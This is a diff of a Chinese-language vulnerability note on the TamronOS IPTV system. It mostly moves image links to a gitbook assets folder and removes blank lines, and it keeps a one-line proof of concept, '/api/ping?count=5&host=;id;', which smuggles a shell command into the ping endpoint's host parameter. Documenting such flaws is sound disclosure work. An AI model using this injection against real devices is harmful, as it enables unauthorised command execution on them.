@@ -20,20 +20,12 @@ app="TamronOS-IPTV系统"
 
 登录页面如下
 
-
-
-![](images/202202101926621.png)
-
-
+![](../.gitbook/assets/202202101926621.png)
 
 ## 漏洞POC为
 
-
-
-```plain
+```
 /api/ping?count=5&host=;id;
 ```
 
-
-
-![](images/202202101927800.png)
+![](../.gitbook/assets/202202101927800.png)
